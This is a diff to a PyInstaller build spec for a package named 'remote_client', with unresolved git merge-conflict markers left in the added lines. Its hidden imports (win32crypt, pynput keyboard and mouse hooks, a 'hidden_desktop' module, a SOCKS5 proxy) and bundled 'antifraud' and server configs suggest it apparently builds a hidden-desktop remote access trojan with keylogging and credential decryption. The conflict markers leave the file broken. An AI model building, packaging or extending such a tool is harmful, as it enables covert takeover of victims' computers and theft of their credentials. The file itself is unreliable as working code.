@@ -2,7 +2,11 @@
 from PyInstaller.utils.hooks import collect_submodules
 from PyInstaller.utils.hooks import collect_all
 
+<<<<<<< HEAD
 datas = [('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_cvb2ebqn\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_cvb2ebqn\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_cvb2ebqn\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_cvb2ebqn\\remote_client\\rc_activity.env', 'remote_client')]
+=======
+datas = [('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_g73l8br_\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_g73l8br_\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_g73l8br_\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_g73l8br_\\remote_client\\rc_activity.env', 'remote_client')]
+>>>>>>> 5298a24c5e0b0c7a47702fb3b4893de45b680a71
 binaries = []
 hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.config', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
 hiddenimports += collect_submodules('remote_client')
